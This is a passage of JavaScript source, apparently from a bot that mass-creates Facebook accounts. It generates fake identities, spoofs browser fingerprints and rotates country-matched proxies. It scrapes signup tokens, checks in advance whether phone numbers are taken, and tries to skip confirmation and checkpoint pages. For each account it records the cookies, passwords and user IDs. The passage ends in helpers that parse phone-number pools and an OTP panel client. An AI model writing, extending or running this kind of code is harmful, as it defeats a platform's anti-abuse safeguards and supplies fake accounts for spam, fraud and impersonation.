    : uid && !/\/(?:confirm(?:phone|email|_code)|checkpoint)/i.test(urlLow)
    ? `${FB_REG_BASE}/home.php`
    : '';
  if (followTarget) {
    try {
      followRes = await fetchWithJar(followTarget, jar, {
        timeoutMs: isTurbo ? Math.min(timeoutMs, 9500) : timeoutMs,
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, Referer: regUrl },
        shouldAbort: opts.shouldAbort,
      });
      if (jar.c_user) uid = jar.c_user;
      if (!uid) {
        const u2 = extractUidFromHtml(followRes.text, followRes.url);
        if (u2) {
          uid = u2;
          jar.c_user = u2;
        }
      }
      trace.push(`follow -> ${followRes.status} (${(followRes.url || '').split('?')[0].slice(-28)})`);
    } catch (err) {
      if (err && err.isProxyError) throw err;
    }
  }

  const ordered = orderCookies(jar);
  const evalBody = followRes ? followRes.text || body : body;
  const evalUrl = followRes ? followRes.url || rPost.url || '' : rPost.url || '';
  const evalUrlLow = evalUrl.toLowerCase();
  const evalSignals = followRes ? extractFbResponseSignals(evalBody) : postSignals;
  const visibleLow = evalSignals.visibleText.toLowerCase();
  const errTexts = evalSignals.errTexts;
  const errBlobLow = errTexts.join(' | ').toLowerCase();
  const errCombinedLow = `${errBlobLow}\n${visibleLow}`;

  // Check skippable dialog / anti-checkpoint skip probe
  if (cfg.skip_probe && (visibleLow.includes('skip') || visibleLow.includes('confirm'))) {
    const skippedOk = await trySkip(jar, evalSignals.decodedHtml, FB_REG_BASE, timeoutMs, px, fp);
    if (skippedOk && jar.c_user) {
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: jar.c_user,
          status: 'OK',
          confirmed: true,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: '',
          fmt,
          engine: 'limited+skip',
        },
      };
    }
  }

  // Real registration errors FIRST (prevent false CONFIRM on error responses!)
  if (
    errCombinedLow.includes('already') &&
    (errCombinedLow.includes('account') || errCombinedLow.includes('registered') || errCombinedLow.includes('used'))
  ) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: '',
        status: 'USED',
        confirmed: false,
        printer: fp.pringer,
        cookies: ordered,
        err: errTexts[0]?.slice(0, 120) || 'Number already has an account',
        fmt,
        engine: 'limited',
      },
    };
  }
  if (
    errCombinedLow.includes('too many') ||
    errCombinedLow.includes('rate limit') ||
    errCombinedLow.includes('try again later') ||
    errCombinedLow.includes('temporarily blocked')
  ) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: '',
        status: 'LIMIT',
        confirmed: false,
        printer: fp.pringer,
        cookies: ordered,
        err: errTexts[0]?.slice(0, 120) || 'Rate limited by Facebook',
        fmt,
        engine: 'limited',
      },
    };
  }
  if (
    ['valid phone', 'valid number', 'valid mobile', 'invalid number', "isn't valid", 'different number', 'please enter a valid'].some((w) =>
      errCombinedLow.includes(w)
    )
  ) {
    return { retryNext: true, err: errTexts[0]?.slice(0, 100) || `invalid format (${fmt})`, html: evalBody };
  }

  // Strict CONFIRM / CHECKPOINT verification (NO false positives from raw JS/BigPipe bootloader strings!)
  const parsedOtp = readForm(evalSignals.decodedHtml, 'otp');
  const otpActionLow = (parsedOtp.action || '').toLowerCase();
  const hasRealOtpForm =
    Boolean(parsedOtp.action) &&
    !otpActionLow.includes('/reg/submit') &&
    (OTP_FIELDS.some((k) => k in parsedOtp.inputs) || /confirm(?:phone|email|_code)|checkpoint/i.test(otpActionLow));

  const confirmUrlDetected =
    interestingUri && interestingUri.startsWith('http')
      ? interestingUri
      : interestingUri
      ? new URL(interestingUri, FB_REG_BASE).toString()
      : evalUrl;

  const navigatedToCheckpoint =
    evalUrlLow.includes('/checkpoint') ||
    urlLow.includes('/checkpoint') ||
    evalSignals.redirectUris.some((u) => /\/checkpoint/i.test(u));

  const navigatedToConfirm =
    /\/confirm(?:phone|email|_code)/i.test(evalUrlLow) ||
    evalSignals.redirectUris.some((u) => /\/confirm(?:phone|email|_code)/i.test(u));

  const visibleConfirmHint =
    CONFIRM_WORDS.some((w) => visibleLow.includes(w) || errBlobLow.includes(w)) &&
    (hasRealOtpForm || navigatedToConfirm || Boolean(uid));

  const isCheckpoint =
    navigatedToCheckpoint ||
    ((visibleLow.includes('we suspended your account') || visibleLow.includes('confirm you') && visibleLow.includes('human')) &&
      (hasRealOtpForm || navigatedToCheckpoint || Boolean(uid)));

  const isConfirm = !isCheckpoint && (hasRealOtpForm || (navigatedToConfirm && visibleConfirmHint));

  if ((isConfirm || isCheckpoint) && (hasRealOtpForm || navigatedToConfirm || navigatedToCheckpoint || Boolean(uid))) {
    const stName = isCheckpoint ? 'CHECKPOINT' : 'CONFIRM';
    const pendingPayload = {
      status: stName,
      phone,
      name: identity.name,
      pass: pw,
      uid: uid || '',
      cookies: orderCookies(jar),
      action: hasRealOtpForm ? parsedOtp.action : '',
      fields: hasRealOtpForm ? Object.fromEntries(Object.entries(parsedOtp.inputs).map(([k, v]) => [k, v[1]])) : {},
      confirm_url: confirmUrlDetected,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: evalBody,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: uid || '',
        status: stName,
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: errTexts[0] ? errTexts[0].slice(0, 120) : '',
        fmt,
        engine: 'limited',
        pendingPayload,
      },
    };
  }

  if (uid && !isConfirm && !isCheckpoint && !navigatedToConfirm && !navigatedToCheckpoint && !hasRealOtpForm) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'limited',
      },
    };
  }

  if (evalUrlLow.includes('login/identify')) {
    return { retryNext: true, err: 'Redirected to recover (IP/fingerprint trust)', html: evalBody };
  }
  if (Object.keys(ordered).length === 0) {
    return { retryNext: true, err: 'No cookies returned', html: evalBody };
  }

  // Last-ditch UID check via loginUid on same jar & sticky proxy
  const loggedUid = await loginUid(cleanPhone.replace(/\D/g, ''), pw, cfg, jar, px, fp);
  if (loggedUid && jar.xs) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: loggedUid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'limited+login',
      },
    };
  }

  const fbRejectedHint =
    errTexts[0] ||
    (visibleLow.includes('couldn') && visibleLow.includes('create') ? "Facebook couldn't create account on this attempt" : '') ||
    (evalUrlLow.includes('/reg/submit') ? 'Rejected on /reg/submit (no UID or confirm page)' : '') ||
    `HTTP ${rPost.status} (${trace.slice(-1)[0] || 'no uid'})`;
  return { retryNext: true, err: fbRejectedHint.slice(0, 140), html: evalBody };
}

async function runClassicSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px, trace, opts }) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const strictProxy = cfg.strict_proxy !== false;
  const tk = await harvestTokens(cfg, jar, trace, px, { shouldAbort: opts.shouldAbort, fp });
  if (!tk) {
    return { retryNext: true, err: `no token (${trace.slice(-2).join(', ') || 'blocked'})` };
  }

  const data = {};
  for (const [k, [typ, val]] of Object.entries(tk.inputs)) {
    if (typ === 'hidden' || k.toLowerCase() === 'lsd' || k.toLowerCase() === 'jazoest') {
      data[k] = val;
    }
  }
  for (const [sname, selectOpts] of Object.entries(tk.selects)) {
    const low = sname.toLowerCase();
    let want = '';
    if (low.includes('month')) want = String(identity.bm);
    else if (low.includes('day')) want = String(identity.bd);
    else if (low.includes('year')) want = String(identity.by);
    else if (low.includes('country')) want = cfg.cc;
    else if (low.includes('sex') || low.includes('gender')) want = identity.sex;
    if (!want) continue;
    const match = selectOpts.find(([v, t]) => v === want || t.trim().startsWith(want));
    if (match) data[sname] = match[0];
  }

  Object.assign(data, {
    firstname: identity.first,
    lastname: identity.last,
    reg_email__: cleanPhone,
    reg_email_confirmation__: cleanPhone,
    reg_passwd__: pw,
    sex: identity.sex,
    birthday_month: String(identity.bm),
    birthday_day: String(identity.bd),
    birthday_year: String(identity.by),
    submit: 'Sign Up',
    lsd: tk.lsd,
    jazoest: jazoest(tk.lsd),
  });
  if (tk.etok) data.e_token = tk.etok;
  if (tk.dhash) data.d_hash = tk.dhash;
  if (tk.cid) data.cid = tk.cid;
  if (tk.regInstance) data.reg_instance = tk.regInstance;
  for (const k of Object.keys(data)) {
    if (k.toLowerCase().includes('country')) data[k] = cfg.cc;
  }
  delete data.password;

  const xrPath = `/mreg${tk.qs}`;
  jar['x-referer'] = encodeURIComponent(JSON.stringify({ r: xrPath, h: xrPath, s: 'm' }));

  let bestRes = null;
  let lastErr = '';
  const isClassicTurbo = Boolean(cfg.hbx_mode && !cfg.human_delay);
  for (const act of tk.actions) {
    if (opts.shouldAbort && opts.shouldAbort()) return { aborted: true };
    try {
      await sleepAbort(cfg.human_delay ? (120 + Math.floor(Math.random() * 150)) : (isClassicTurbo ? 20 : 75), opts.shouldAbort);
      const r = await fetchWithJar(act, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs: isClassicTurbo ? Math.min(timeoutMs + 1000, 11500) : timeoutMs + 3000,
        proxy: px,
        strictProxy,
        shouldAbort: opts.shouldAbort,
        ua: tk.ua,
        headers: {
          Referer: `${tk.base}/reg/${tk.qs}`,
          Origin: tk.base,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      trace.push(`post ${act.split('facebook.com').pop()?.slice(0, 18)} -> ${r.status}/${(r.text || '').length}B`);
      if (r.status < 400 && (r.text || '').length > 800) {
        bestRes = r;
        const visibleLow = extractVisibleText(r.text || '').toLowerCase();
        if (jar.c_user || CONFIRM_WORDS.some((w) => visibleLow.includes(w)) || ERR_WORDS.some(([p]) => visibleLow.includes(p))) {
          break;
        }
      }
      if (!bestRes) bestRes = r;
    } catch (err) {
      if (err && err.isProxyError) throw err;
      lastErr = err instanceof Error ? err.message : 'post failed';
    }
  }

  if (!bestRes) {
    return { retryNext: true, err: lastErr || 'classic post failed' };
  }

  let body = bestRes.text || '';
  let signals = extractFbResponseSignals(body);
  let resUrl = bestRes.url || '';
  let resUrlLow = resUrl.toLowerCase();

  const classicInterestingUri =
    signals.redirectUris.find((u) => /\/(?:confirm(?:phone|email|_code)|checkpoint|recover)/i.test(u) && !u.includes('/r.php')) ||
    signals.redirectUris.find((u) => /\/(?:home\.php|welcome)/i.test(u) && !u.includes('/r.php'));

  if (
    jar.c_user &&
    !/\/(?:confirm(?:phone|email|_code)|checkpoint)/i.test(resUrlLow)
  ) {
    try {
      const probeTarget = classicInterestingUri
        ? new URL(classicInterestingUri, tk.base).toString()
        : `${tk.base}/home.php`;
      const fProbe = await fetchWithJar(probeTarget, jar, {
        timeoutMs,
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, Referer: bestRes.url || `${tk.base}/reg/${tk.qs}` },
        shouldAbort: opts.shouldAbort,
      });
      if (fProbe && fProbe.text) {
        body = fProbe.text;
        resUrl = fProbe.url || probeTarget;
        resUrlLow = resUrl.toLowerCase();
        signals = extractFbResponseSignals(body);
      }
    } catch {
      // keep initial response
    }
  }

  const visibleLow = signals.visibleText.toLowerCase();
  const rawLow = body.toLowerCase();

  const parsedOtp = readForm(signals.decodedHtml, 'otp');
  const otpActionLow = (parsedOtp.action || '').toLowerCase();
  const hasRealOtpForm =
    Boolean(parsedOtp.action) &&
    !otpActionLow.includes('/reg/submit') &&
    (OTP_FIELDS.some((k) => k in parsedOtp.inputs) || /confirm(?:phone|email|_code)|checkpoint/i.test(otpActionLow));
  const navigatedToConfirm =
    /\/confirm(?:phone|email|_code)/i.test(resUrlLow) ||
    signals.redirectUris.some((u) => /\/confirm(?:phone|email|_code)/i.test(u));
  const navigatedToCheckpoint =
    resUrlLow.includes('/checkpoint') ||
    signals.redirectUris.some((u) => /\/checkpoint/i.test(u));
  const isConfirm =
    !navigatedToCheckpoint &&
    (hasRealOtpForm || (navigatedToConfirm && (CONFIRM_WORDS.some((w) => visibleLow.includes(w)) || Boolean(jar.c_user))));

  if (isConfirm && cfg.skip_probe) {
    const skippedOk = await trySkip(jar, signals.decodedHtml, tk.base, timeoutMs, px, fp);
    if (skippedOk && jar.c_user) {
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: jar.c_user,
          status: 'OK',
          confirmed: true,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: '',
          fmt,
          engine: 'classic+skip',
        },
      };
    }
  }

  if (isConfirm || navigatedToCheckpoint) {
    const stName = navigatedToCheckpoint ? 'CHECKPOINT' : 'CONFIRM';
    const pendingPayload = {
      status: stName,
      phone,
      name: identity.name,
      pass: pw,
      uid: jar.c_user || '',
      cookies: orderCookies(jar),
      action: hasRealOtpForm ? parsedOtp.action : '',
      fields: hasRealOtpForm ? Object.fromEntries(Object.entries(parsedOtp.inputs).map(([k, v]) => [k, v[1]])) : {},
      confirm_url: resUrl,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: body,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user || '',
        status: stName,
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: navigatedToCheckpoint ? 'checkpoint verify required' : '',
        fmt,
        engine: 'classic',
        pendingPayload,
      },
    };
  }

  if (jar.c_user) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic',
      },
    };
  }

  for (const [phrase, st] of ERR_WORDS) {
    if (visibleLow.includes(phrase)) {
      if (st === 'BADNUM') {
        return { retryNext: true, err: `invalid format (${fmt})`, html: body };
      }
      return {
        result: {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: '',
          status: st,
          confirmed: false,
          printer: fp.pringer,
          cookies: orderCookies(jar),
          err: phrase,
          fmt,
          engine: 'classic',
        },
      };
    }
  }

  const loggedUid = await loginUid(cleanPhone.replace(/\D/g, ''), pw, cfg, jar, px, fp);
  if (loggedUid && jar.xs) {
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: loggedUid,
        status: 'OK',
        confirmed: true,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic+login',
      },
    };
  }

  if (resUrlLow.includes('/checkpoint') || (hasRealOtpForm && otpActionLow.includes('checkpoint'))) {
    const cpForm = parsedOtp;
    const pendingPayload = {
      status: 'CHECKPOINT',
      phone,
      name: identity.name,
      pass: pw,
      uid: jar.c_user || '',
      cookies: orderCookies(jar),
      action: cpForm.action,
      fields: Object.fromEntries(Object.entries(cpForm.inputs).map(([k, v]) => [k, v[1]])),
      confirm_url: bestRes.url,
      proxy: px || '',
      ua: fp.ua,
      pringer: fp.pringer,
      fmt,
      confirmed: false,
      createdAt: Date.now(),
      resendCount: 0,
      _lastConfirmHtml: body,
    };
    return {
      result: {
        ts: Math.floor(Date.now() / 1000),
        name: identity.name,
        number: phone,
        password: pw,
        uid: jar.c_user || '',
        status: 'CHECKPOINT',
        confirmed: false,
        printer: fp.pringer,
        cookies: orderCookies(jar),
        err: '',
        fmt,
        engine: 'classic',
        pendingPayload,
      },
    };
  }

  if (body.includes('reg_email__')) {
    const errs = signals.errTexts.join(' | ').slice(0, 140);
    return { retryNext: true, err: `re-render: ${errs || 'no msg'}`, html: body };
  }

  if (!tk.hasClassicForm && (tk.isCometSpa || rawLow.includes('caaregistration'))) {
    return { retryNext: true, err: `Comet SPA (${bestRes.status})`, html: body };
  }

  return { retryNext: true, err: signals.errTexts[0]?.slice(0, 120) || `HTTP ${bestRes.status} (${trace.slice(-1)[0] || 'no confirm form'})`, html: body };
}

async function runNodeAttempt(phone, pw, cfg, proxy, opts = {}) {
  const numDet = detectCountryFromNumber(`+${phone}`, cfg.cc, opts.countryHint || '') || {
    normalized: phone,
    cc: cfg.cc,
    name: opts.countryHint || getCountryInfo(cfg.cc)[0],
    iso: countryNameToIso(opts.countryHint) || getCountryInfo(cfg.cc)[1],
  };
  const autoCountry = cfg.auto_proxy_country !== false;
  const autoRefresh = cfg.auto_proxy_refresh !== false;
  const effectiveCc = autoCountry && numDet.cc ? numDet.cc : cfg.cc;
  const [fbName, fbIso] = getCountryInfo(effectiveCc);
  const effectiveName = numDet.name && numDet.name !== 'Unknown' ? numDet.name : (opts.countryHint || fbName);
  const effectiveIso = autoCountry && numDet.iso && numDet.iso !== '??' ? numDet.iso : (countryNameToIso(opts.countryHint) || fbIso);

  const identity = generateIdentity(effectiveCc);
  const fmts = numberVariants(phone, effectiveCc);
  const pool = [...(opts.proxiesPool || [])];
  if (cfg.proxy_mode === 'random') {
    for (let k = pool.length - 1; k > 0; k--) {
      const j = Math.floor(Math.random() * (k + 1));
      [pool[k], pool[j]] = [pool[j], pool[k]];
    }
  }
  const defaultMinTries = opts.fastMode || cfg.hbx_mode ? 2 : 5;
  const tries = Math.max(opts.minRetries || defaultMinTries, Math.min(12, Number(cfg.retries || defaultMinTries)));
  const badProxies = opts.badProxies || new Set();
  const engineMode = cfg.engine_mode || 'hybrid';
  let lastErr = 'unknown';
  let lastFmt = fmts[0] || phone;
  let lastHtml = '';
  let lastPringer = '';

  const log = (m) => {
    if (opts.onDebug) opts.onDebug(m);
    else appendDebugLog(m);
  };

  // Optional GraphQL pre-check before wasting registration attempts (defaults to 0-proxy Direct GQL)
  if (cfg.precheck_gql !== false && !opts.skipPrecheck) {
    const useDirectGql = cfg.gql_via_direct !== false;
    const rawPrePx = useDirectGql
      ? null
      : pool.length > 0
      ? selectSmartProxy(pool, 0, badProxies, cfg.proxy_mode || 'rotate', proxy || cfg.proxy || null)
      : proxy || cfg.proxy || null;
    const preAdapted = adaptProxyForSession(rawPrePx, {
      iso: effectiveIso,
      autoCountry,
      refreshSession: autoRefresh,
    });
    let prePx = useDirectGql ? null : preAdapted.url;
    let preIsoUsed = useDirectGql ? 'DIRECT' : (preAdapted.isoApplied || effectiveIso || 'PX');
    const runPrecheck = async (proxyTarget) =>
      checkNumberGraphql(`+${phone}`, {
        cc: effectiveCc,
        proxy: proxyTarget,
        strictProxy: cfg.strict_proxy !== false,
        timeoutMs: Math.min((cfg.timeout || 18) * 1000, 10000),
        shouldAbort: opts.shouldAbort,
      });

    try {
      let gql;
      try {
        gql = await runPrecheck(prePx);
      } catch (err) {
        if (err && err.isProxyError && /407/.test(err.message || '') && rawPrePx && (preAdapted.countryInjected || preAdapted.sessionInjected)) {
          dynamicProxyTagBlacklist.add(proxyHealthKey(rawPrePx));
          prePx = rawPrePx;
          preIsoUsed = effectiveIso || 'STATIC';
          gql = await runPrecheck(rawPrePx);
        } else {
          throw err;
        }
      }
      const pxTag = prePx
        ? ` [${effectiveName} • ${preIsoUsed}${preAdapted.sessionId ? `:${preAdapted.sessionId.slice(0, 6)}` : ''}]`
        : ` [${effectiveName} • ${effectiveIso} • DirectGQL]`;
      log(`+${phone}${pxTag} GQL pre-check -> ${gql.status}${gql.nameHint ? ` (${gql.nameHint})` : ''}${gql.reason ? ` [${gql.reason}]` : ''}`);
      if (gql.status === 'taken') {
        return {
          ts: Math.floor(Date.now() / 1000),
          name: identity.name,
          number: phone,
          password: pw,
          uid: '',
          status: 'USED',
          confirmed: false,
          printer: '',
          cookies: {},
          err: `Taken (GQL${gql.nameHint ? ': ' + gql.nameHint : ''})`,
          fmt: lastFmt,
          engine: 'graphql-precheck',
          countryName: effectiveName,
          countryIso: effectiveIso,
          countryCc: effectiveCc,
          proxyIso: preIsoUsed,
          proxySession: preAdapted.sessionId || '',
        };
      }
    } catch (err) {
      if (err && err.isProxyError && rawPrePx) badProxies.add(proxyHealthKey(rawPrePx));
      log(`+${phone} [${effectiveIso}] GQL pre-check err: ${err instanceof Error ? err.message : 'failed'}`);
    }
  }

  for (let i = 0; i < tries; i++) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const fmt = fmts[Math.min(Math.floor(i / 2), fmts.length - 1)];
    lastFmt = fmt;
    const digitsOnly = fmt.replace(/\D/g, '');
    const cleanPhone = fmt.startsWith('+') ? `+${digitsOnly}` : digitsOnly;
    const fp = cfg.hbx_mode ? buildHbxFingerprint(effectiveCc) : buildFingerprint(effectiveCc);
    lastPringer = fp.pringer;

    const useLimited = engineMode === 'limited' || (engineMode === 'limited_first' && i < 3) || (engineMode === 'hybrid' && i % 2 === 0);
    // Limited engine matches bot.py: start with empty cookie jar so FB issues authentic datr/sb on warmup GET
    const jar = useLimited ? {} : parseCookieHeader(opts.baseCookiesRaw || normalizeBaseCookiesRaw(''));
    if (!useLimited) {
      jar.wd = `${fp.sw}x${fp.sh}`;
      jar.m_pixel_ratio = String(fp.dpr);
      if (cfg.fresh_id) {
        jar.sb = freshSb();
        jar.datr = randTok(12);
      }
    }

    const rawPx =
      pool.length > 0
        ? selectSmartProxy(pool, i, badProxies, cfg.proxy_mode || 'rotate', proxy || cfg.proxy || null, effectiveIso)
        : proxy || cfg.proxy || null;
    // Nanosecond country switch + automatic per-attempt fresh sticky session IP
    const adaptedPx = adaptProxyForSession(rawPx, {
      iso: effectiveIso,
      autoCountry,
      refreshSession: autoRefresh,
    });
    let px = adaptedPx.url;
    let appliedIso = adaptedPx.isoApplied || effectiveIso;
    let appliedSession = adaptedPx.sessionId || '';
    const trace = [];
    if (px) {
      trace.push(`px=${appliedIso}${appliedSession ? ':' + appliedSession.slice(0, 6) : ''}`);
    }

    const execStep = async (proxyTarget) =>
      useLimited
        ? runLimitedSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px: proxyTarget, trace, opts })
        : runClassicSignupStep({ phone, cleanPhone, fmt, pw, identity, fp, cfg, jar, px: proxyTarget, trace, opts });

    try {
      let stepRes;
      try {
        stepRes = await execStep(px);
      } catch (err) {
        if (err && err.isProxyError && /407/.test(err.message || '') && rawPx && (adaptedPx.countryInjected || adaptedPx.sessionInjected)) {
          dynamicProxyTagBlacklist.add(proxyHealthKey(rawPx));
          px = rawPx;
          appliedIso = effectiveIso;
          appliedSession = '';
          trace.push('407-static-fallback');
          log(`+${phone} [${effectiveIso}] Proxy rejected auto-tag (407); retrying original proxy credentials`);
          stepRes = await execStep(rawPx);
        } else {
          throw err;
        }
      }

      if (stepRes.aborted) break;
      if (stepRes.result) {
        stepRes.result.countryName = effectiveName;
        stepRes.result.countryIso = effectiveIso;
        stepRes.result.countryCc = effectiveCc;
        stepRes.result.proxyIso = appliedIso;
        stepRes.result.proxySession = appliedSession;
        if (fp.hwFpObj) stepRes.result.hwFp = fp.hwFpObj;
        if (fp.profileLabel) stepRes.result.browserProfile = fp.profileLabel;
        if (stepRes.result.pendingPayload) {
          stepRes.result.pendingPayload.iso = effectiveIso;
          stepRes.result.pendingPayload.country = effectiveName;
          stepRes.result.pendingPayload.cc = effectiveCc;
          stepRes.result.pendingPayload.proxyIso = appliedIso;
          stepRes.result.pendingPayload.proxySession = appliedSession;
          if (rawPx) stepRes.result.pendingPayload.rawProxy = rawPx;
          if (!stepRes.result.pendingPayload.proxy && px) stepRes.result.pendingPayload.proxy = px;
        }
        log(`+${phone} [${effectiveName} • ${effectiveIso}] ${stepRes.result.status}${stepRes.result.uid ? ` UID=${stepRes.result.uid}` : ''} [${stepRes.result.engine}] ${trace.join(' | ')}`);
        return stepRes.result;
      }
      if (stepRes.html) lastHtml = stepRes.html.slice(0, 6000);
      lastErr = stepRes.err || 'no result';
      if (rawPx && /LSD_FAIL_AFTER_WIPE|HTTP 403|HTTP 429/i.test(lastErr)) {
        badProxies.add(proxyHealthKey(rawPx));
      }
      log(`+${phone} [${effectiveName} • ${effectiveIso}] try ${i + 1}/${tries} (${useLimited ? 'limited' : 'classic'}) [${appliedIso}${appliedSession ? `:${appliedSession.slice(0, 6)}` : ''}]: ${lastErr}`);
    } catch (err) {
      if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
      lastErr = err instanceof Error ? err.message : 'attempt error';
      log(`+${phone} [${effectiveIso}] try ${i + 1}/${tries} err: ${lastErr}`);
    }
  }

  return {
    ts: Math.floor(Date.now() / 1000),
    name: identity.name,
    number: phone,
    password: pw,
    uid: '',
    status: 'FAIL',
    confirmed: false,
    printer: lastPringer,
    cookies: {},
    err: lastErr,
    fmt: lastFmt,
    debugHtml: lastHtml,
    countryName: effectiveName,
    countryIso: effectiveIso,
    countryCc: effectiveCc,
  };
}

async function runDiagnoseFor(cfg, cookieRaw, proxyOverride) {
  const jar = parseCookieHeader(cookieRaw || normalizeBaseCookiesRaw(''));
  const trace = [];
  const px = proxyOverride !== undefined ? proxyOverride : cfg.proxy || null;
  const fp = buildFingerprint(cfg.cc);
  const fastCfg = { ...cfg, timeout: Math.min(Number(cfg.timeout || 18), 10) };

  const [tk, pr, gqlRes] = await Promise.all([
    harvestTokens(fastCfg, jar, trace, px, { fp }).catch(() => null),
    px ? testProxyTcp(px, true).catch((err) => ({ ok: false, error: err instanceof Error ? err.message : 'failed', exitIp: '', latencyMs: 0 })) : Promise.resolve(null),
    checkNumberGraphql('+8801700000001', {
      cc: cfg.cc,
      proxy: cfg.gql_via_direct !== false ? null : px,
      strictProxy: cfg.strict_proxy !== false,
      timeoutMs: 9000,
    }).catch((err) => ({ status: 'error', reason: err instanceof Error ? err.message : 'failed' })),
  ]);

  const proxyAlive = pr ? pr.ok : null;
  const proxyError = pr ? pr.error : undefined;
  const proxyExitIp = pr ? pr.exitIp || '' : '';
  const proxyLatency = pr ? pr.latencyMs || 0 : 0;
  const gqlOk = gqlRes.status === 'free' || gqlRes.status === 'taken';
  const gqlInfo = gqlRes.status === 'error'
    ? gqlRes.reason
    : `${gqlRes.status}${gqlRes.reason ? ` (${gqlRes.reason})` : ''}`;

  return {
    defaultProxy: px || '',
    proxyAlive,
    proxyError,
    proxyExitIp,
    proxyLatency,
    gqlOk,
    gqlInfo,
    pringerSample: fp.pringer,
    deviceSample: `${fp.brand} ${fp.model} (Chrome ${fp.chromeMajor})`,
    trace,
    tokenOk: Boolean(tk),
    src: tk?.src || '',
    etok: tk?.etok || '',
    dhash: tk?.dhash || '',
    lsd: tk?.lsd || '',
    cid: tk?.cid || '',
    actions: tk?.actions || [],
    fields: tk ? Object.keys(tk.inputs) : [],
    cookiesCount: Object.keys(jar).length,
  };
}

// ----------------------------------------------------------------------------
// 5b. Multi-Auth OTP API Panel Client, File Parsers (.txt/.csv/.xlsx) & OTP Extractor
// ----------------------------------------------------------------------------
function maskSecretKey(k) {
  const s = String(k || '').trim();
  if (!s) return 'NOT SET';
  if (s.length <= 6) return `${s.slice(0, 2)}***`;
  return `${s.slice(0, 4)}••••${s.slice(-3)}`;
}

function decodeXmlEntities(text) {
  return String(text || '')
    .replace(/&amp;/g, '&')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&apos;/g, "'")
    .replace(/&#(\d+);/g, (_, d) => {
      const code = Number(d);
      return Number.isFinite(code) ? String.fromCodePoint(code) : _;
    })
    .replace(/&#x([0-9a-fA-F]+);/g, (_, h) => {
      const code = parseInt(h, 16);
      return Number.isFinite(code) ? String.fromCodePoint(code) : _;
    });
}

function _stripHtmlText(text) {
  return decodeXmlEntities(String(text || '').replace(/<[^>]+>/g, '')).trim();
}

function normalizePoolPhoneNumber(value) {
  let raw = String(value ?? '').trim();
  if (!raw) return '';
  if (/^\d+\.0+$/.test(raw)) {
    raw = raw.replace(/\.0+$/, '');
  } else if (/^[+-]?\d+(?:\.\d+)?[eE][+-]?\d+$/.test(raw)) {
    const num = Number(raw);
    if (Number.isFinite(num) && num > 0) {
      raw = num.toFixed(0);
    }
  }
  const digits = raw.replace(/\D/g, '');
  if (digits.length < 7 || digits.length > 15) return '';
  return digits;
}

function normalizeUniquePoolNumbers(values) {
  const out = [];
  const seen = new Set();
  for (const val of values) {
    const n = normalizePoolPhoneNumber(val);
    if (!n || seen.has(n)) continue;
    seen.add(n);
    out.push(n);
  }
  return out;
}

function parseTxtBuffer(buf) {
  const text = Buffer.isBuffer(buf) ? buf.toString('utf-8') : String(buf || '');
  const out = [];
  for (const line of text.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    const tokens = trimmed.split(/[\s,;|]+/).map((s) => s.trim()).filter(Boolean);
    if (tokens.length <= 1) out.push(trimmed);
    else out.push(...tokens);
  }
  return out;
}

function parseCsvBuffer(buf) {
  const text = Buffer.isBuffer(buf) ? buf.toString('utf-8') : String(buf || '');
  const cells = [];
  let field = '';
  let inQuotes = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        field += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',' || ch === '\n' || ch === '\r' || ch === ';' || ch === '\t') {
